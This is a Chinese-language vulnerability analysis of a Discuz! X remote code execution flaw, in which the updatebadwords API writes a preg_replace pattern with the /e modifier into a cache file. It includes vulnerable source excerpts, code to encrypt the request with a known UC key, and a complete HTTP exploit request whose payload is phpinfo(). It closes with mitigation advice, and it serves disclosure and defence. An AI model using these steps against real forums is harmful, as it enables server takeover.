# Discuz! X系列远程代码执行漏洞分析

0x00 漏洞概述
=========

* * *

上周有一个朋友问我有没有办法在知道uc的appkey的情况下getshell，刚好我在原来看discuz代码时曾经有过几个相关的想法，但是一直没有仔细去看，接着这个机会去看了下，果然有个很好玩的代码执行漏洞。

0x01 漏洞根源
=========

* * *

这个问题的根源在于api/uc.php文件中的updatebadwords方法，代码如下：

```
function updatebadwords($get, $post) {
        global $_G;

        if(!API_UPDATEBADWORDS) {
            return API_RETURN_FORBIDDEN;
        }

        $data = array();
        if(is_array($post)) {
            foreach($post as $k => $v) {
                $data['findpattern'][$k] = $v['findpattern'];
                $data['replace'][$k] = $v['replacement'];
            }
        }
        $cachefile = DISCUZ_ROOT.'./uc_client/data/cache/badwords.php';
        $fp = fopen($cachefile, 'w');
        $s = "<?php\r\n";
        $s .= '$_CACHE[\'badwords\'] = '.var_export($data, TRUE).";\r\n";
        fwrite($fp, $s);
        fclose($fp);

        return API_RETURN_SUCCEED;
    }

```

方法参数中的`$get`和`$post`就是用户所传入的内容，从上面代码我们可以看出在解析`$post`内容之后，将其写入到名为`badwords`的缓存中。这里代码使用了`var_export`来避免用户传递单引号来封闭之前语句，注入php代码。

但是这里有两个关键词让我眼前一亮“`findpattern`”和“`replacement`”，也就是说这个缓存内容是会被作为执行的。那么如果我向findpattern中传入带有e参数的正则表达式，不就可以实现任意代码执行了吗？

0x02 漏洞触发
=========

* * *

全局代码搜了下`badwords`，用的地方比较少，主要集中在uc的pm和user模块中。这里我用user来举例，在`uc_client/model/user.php`文件中有一个`check_usernamecensor`方法，来校验用户名中是否有badwords，如果有的话就将他替换掉，代码如下：

```
function check_usernamecensor($username) {
    $_CACHE['badwords'] = $this->base->cache('badwords');
    $censorusername = $this->base->get_setting('censorusername');
    $censorusername = $censorusername['censorusername'];
    $censorexp = '/^('.str_replace(array('\\*', "\r\n", ' '), array('.*', '|', ''), preg_quote(($censorusername = trim($censorusername)), '/')).')$/i';
    $usernamereplaced = isset($_CACHE['badwords']['findpattern']) && !empty($_CACHE['badwords']['findpattern']) ? @preg_replace($_CACHE['badwords']['findpattern'], $_CACHE['badwords']['replace'], $username) : $username;
    if(($usernamereplaced != $username) || ($censorusername && preg_match($censorexp, $username))) {
        return FALSE;
    } else {
        return TRUE;
    }
}

```

可以看到代码中使用了preg_replace，那么如果我们的正则表达式写成“/.*/e"，就可以在使用这个方法的地方进行任意代码执行了。而这个方法在disucz中，只要是添加或者修改用户名的地方都会用到。

0x03 漏洞利用
=========

* * *

首先我们们访问`api/uc.php`（居然可以直接访问，好开心），之后我们会发现uc处理机制中比较讨厌的环节——用户传递的参数需要经过`UC_KEY`加密：

```
if(!defined('IN_UC')) {
    require_once '../source/class/class_core.php';

    $discuz = C::app();
    $discuz->init();

    require DISCUZ_ROOT.'./config/config_ucenter.php';

    $get = $post = array();

    $code = @$_GET['code'];
    parse_str(authcode($code, 'DECODE', UC_KEY), $get);

```

所以这里需要有个前提，需要知道UC_KEY或者可以操控UC_KEY。那么问题来了，我们要怎么达到这个前提呢？

我们在后台中站长`->UCenter`设置中发现有“`UCenter 通信密钥`”这个字段，这是用于操控discuz和uc连接的app key，而非高级的uc_server key，不过对于我们getshell来说足够了。在这里修改为任意值，这样我们就获取到了加密用的key值了。

![enter image description here](http://drops.javaweb.org/uploads/images/310b329b0907e1fb59c1e82534f02a751a563f4b.jpg)

从下图我们可以看到，配置文件已经被修改了:

![enter image description here](http://drops.javaweb.org/uploads/images/8bfc0fd80506345d406dbfb5f63a8c64bc112a5b.jpg)

然后我们在自己搭建的discuz的`api/uc.php`文件中添加两行代码，来加密get请求所需要的内容：

```
$a = 'time='.time().'&action=updatebadwords';
   $code = authcode($a, 'ENCODE', 'tang3');
   echo $code;exit;

```

这样我们就可以获取到加密后的code值了！

![enter image description here](http://drops.javaweb.org/uploads/images/27117932d6bcf628d8bc6fc417d2a61c34a51de8.jpg)

然后用post方法向api/uc.php发送带有正则表达式信息的xml数据包，请求头中有两个地方需要注意，一个是formhash，一个是刚才获取的code需要进行一次url编码，否则解密会出现问题。我使用的数据包如下图所示：

```
POST /discuzx3.220150602/api/uc.php?formhash=e6d7c425&code=38f8nhcm4VRgdUvoEUoEs/OpuXNJDgh0Qfep%2bT52HDEyTpHnR4PQ80%2be%2bNCyOWI0DMrXizYwbGFcM/J0Y3a8Zc/N HTTP/1.1
Host: 192.168.188.144
Proxy-Connection: keep-alive
Content-Length: 178
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://192.168.188.144
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2415.0 Safari/537.36
Content-Type: text/xml
Referer: http://192.168.188.144/discuzx3.220150602/admin.php?action=setting&operation=uc
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: FPDO_2132_saltkey=Z777zGG4; FPDO_2132_lastvisit=1432691505; FPDO_2132_ulastactivity=5830S8vsYWw6CpVTPpdtOgw6cPIZugHKtMQidjBgfdqDGbQJfSmj; so6a_2132_saltkey=JjZJ2klz; so6a_2132_lastvisit=1433227409; so6a_2132_nofavfid=1; so6a_2132_forum_lastvisit=D_2_1433233630; so6a_2132_visitedfid=2; so6a_2132_editormode_e=1; so6a_2132_smile=1D1; so6a_2132_lastcheckfeed=1%7C1433239071; XDEBUG_SESSION=PHPSTORM; so6a_2132_ulastactivity=5238LLJuvhc%2FhKaXEaIzRYm5hbbEAlOy3RL8Lc92aDETkVQJidZY; so6a_2132_auth=96c9HcEpd8OxPZh6GE5stu4Uov%2BUncVwxWbetMvF%2BFZLNuEVj8VoiFyDMkWkXdQ81eg%2F6522CLnsHbkzv%2Fdu; so6a_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; so6a_2132_creditbase=0D0D10D0D0D0D0D0D0; so6a_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; so6a_2132_checkupgrade=1; so6a_2132_lastact=1433476664%09admin.php%09; so6a_2132_sid=LE2xb1

<?xml version="1.0" encoding="ISO-8859-1"?>
<root>
    <item id="balabala">
        <item id="findpattern">/.*/e</item>
        <item id="replacement">phpinfo();</item>
    </item>
</root>

```

发送后可以发现`uc_client/data/cache`目录下的`badwords.php`内容变为了我们刚刚设定的正则表达式的样子：

![enter image description here](http://drops.javaweb.org/uploads/images/1a1ddf72700bc0e90c2705cdd231383e12313062.jpg)

之后利用方法就有很多种了，可以通过增加一个用户来实现代码执行，也可以通过发消息的方式来触发，这里我以添加一个用户为例。

![enter image description here](http://drops.javaweb.org/uploads/images/41d4dd3a19c94abd5961c909023b0276a7b94334.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/be960bd2045be25eb155520a1dfbace446fa8eb8.jpg)

0x04 漏洞总结
=========

* * *

### 漏洞小结

1.影响范围个人评价为“高”，Discuz! X系列cms在国内使用范围极广，几乎所有中小型论坛都是用它搭建的。

2.危害性个人评价为“高”，这个漏洞不只是单纯的后台代码执行，在uc_app key泄露的情况下也是可以利用的，很多转账对于uc_app key重视程度不是很大，所以相对来说危害性还是非常高的。

### 防护方案

限制用户提交正则表达式的内容，允许提交正则表达式就可以了，就不要让用户提交正则参数了吧。而且纯粹的使用正则表达式替换字符串，str_replace不可以吗？